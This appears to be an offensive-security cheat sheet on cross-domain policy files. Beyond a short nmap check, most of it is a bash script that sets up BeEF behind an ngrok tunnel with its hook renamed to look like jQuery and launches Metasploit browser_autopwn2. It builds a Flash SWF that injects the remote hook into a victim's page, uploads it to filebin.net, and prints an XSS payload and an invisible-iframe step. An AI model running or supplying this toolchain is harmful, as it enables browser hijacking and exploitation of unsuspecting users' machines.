# RIA Cross Domain Policy

## Check List

* [ ] _Review and validate the policy files._

## Cheat Sheet

### Check Policy Files Weakness

#### [Nmap](https://nmap.org/)

_Check crossdomain.xml & clientaccesspolicy.xml_

```bash
nmap -p 80,443 \
     -sS -sV --mtu 5000 \
     --script http-cross-domain-policy \
     --script-args http-cross-domain-policy.domain-lookup=true $WEBSITE
```

### [BeEF](https://github.com/beefproject/beef) (SWF)

_Create Script_

```bash
sudo nano beefer.sh
```

```bash
#!/bin/bash

RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
CYAN='\e[1;36m'
RESET='\e[0m'

# Check for ROOT
if [[ "$(id -u)" -ne 0 ]]; then
    printf "${RED}[X] Please run as ROOT...\n"
    printf "${GREEN}[*] sudo ./beef-csp-bypass.sh\n"
    exit 1
fi

# Get LAN and WAN IP addresses
LAN=$(hostname -I | awk '{print $1}')
WAN=$(curl -s https://api.ipify.org)

# Kill any running ngrok or ruby instances
pkill -f 'ngrok|ruby'

# Run Ngrok
msfconsole -qx "load msgrpc ServerHost=$LAN Pass=abc123 SSL=y;use auxiliary/server/browser_autopwn2;set LHOST $WAN;set URIPATH /pwn;run -z" >/dev/null 2>&1 &
sleep 1
ngrok http 3000 &>/dev/null &
sleep 3
NGHOST=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url | sed 's|https://||')
printf "${GREEN}[*] ngrok started successfully...${RESET}\n"

# Config BeEF
if grep -q "https: false" /usr/share/beef-xss/config.yaml; then
    sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
           -e 's|passwd: "beef"|passwd: "00980098"|g' \
           -e 's|# public:|public:|g' \
           -e 's|#     host: "" # public|     host: "'$NGHOST'" # public|' \
           -e 's|#     port: "" # public|     port: "443" # public|g' \
           -e 's|#     https: false|     https: true|g' \
           -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
           -e 's|hook.js|jqueryctl.js|g' \
           -e 's|BEEFHOOK|UNKSESSION|g' /usr/share/beef-xss/config.yaml
    sed -i -e 's|enable: false|enable: true|g' \
           -e 's|host: "127.0.0.1"|host: "'$LAN'"|g' \
           -e 's|callback_host: "127.0.0.1"|callback_host: "'$LAN'"|g' \
           -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' /usr/share/beef-xss/extensions/metasploit/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/extensions/evasion/config.yaml
else
    sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
           -e 's|passwd: "beef"|passwd: "00980098"|g' \
           -e 's|# public:|public:|g' \
           -e 's|host: ".*" # public|host: "'$NGHOST'" # public|' \
           -e 's|port: ".*" # public|port: "443" # public|g' \
           -e 's|https: false|https: true|g' \
           -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
           -e 's|hook.js|jqueryctl.js|g' \
           -e 's|BEEFHOOK|UNKSESSION|g' /usr/share/beef-xss/config.yaml
    sed -i -e 's|enable: false|enable: true|g' \
           -e 's|host: ".*"|host: "'$LAN'"|g' \
           -e 's|callback_host: ".*"|callback_host: "'$LAN'"|g' \
           -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' /usr/share/beef-xss/extensions/metasploit/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
    sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/extensions/evasion/config.yaml
fi
printf "${GREEN}[*] BeEF with new configuration...${RESET}\n"

# Start BeEF XSS framework
cd /usr/share/beef-xss && ./beef -x &>/dev/null &

# Create the SWF payload
cat <<EOF > /tmp/beef.as
package {
    import flash.display.MovieClip;
    import flash.net.URLRequest;
    import flash.net.navigateToURL;

    public class beef extends MovieClip {
        public function beef() {
            var request:URLRequest = new URLRequest("javascript:function myFunction(){var x = document.createElement('SCRIPT');x.src='https://${NGHOST}/jqueryctl.js';document.body.appendChild(x);};myFunction();");
            navigateToURL(request);
        }
    }
}
EOF
/opt/flex-sdk/bin/mxmlc /tmp/beef.as -output /tmp/logo.swf &>/dev/null &
rm -f /tmp/beef.as
printf "${GREEN}[*] SWF payload generated successfully...${RESET}\n"

# Upload to Filebin and Display Payload
bin_id=$(curl -s https://filebin.net | grep -oP 'href="https://filebin.net/(\w+)"' | sed -E 's/href="https:\/\/filebin.net\/([a-zA-Z0-9]+)"/\1/')
curl -s -X POST "https://filebin.net/${bin_id}/logo.swf" -H "Content-Type: application/x-shockwave-flash" --data-binary "@/tmp/logo.swf"
rm -f /tmp/logo.swf
clear
printf "\n\n"
printf "${CYAN}XSS Payload:${RESET}\n"
printf "\n"
printf "${YELLOW}<object type=\"application/x-shockwave-flash\" data=\"https://filebin.net/${bin_id}/logo.swf\"><param name=\"movie\" value=\"https://filebin.net/${bin_id}/logo.swf\"></object>"
printf "\n"
printf "${CYAN}BeEF Panel: https://${NGHOST}/ui/panel${RESET}\n"
printf "${CYAN}BeEF USER: unk9vvn${RESET}\n"
printf "${CYAN}BeEF PASS: 00980098${RESET}\n"
printf "\n"
printf "${GREEN}BeEF Panel > Commands > Misc > Create Invisible Iframe > URL: http://$WAN:8080/pwn > Execute${RESET}\n"
```

_Run Script_

```bash
sudo chmod +x beefer.sh;sudo ./beefer.sh
```
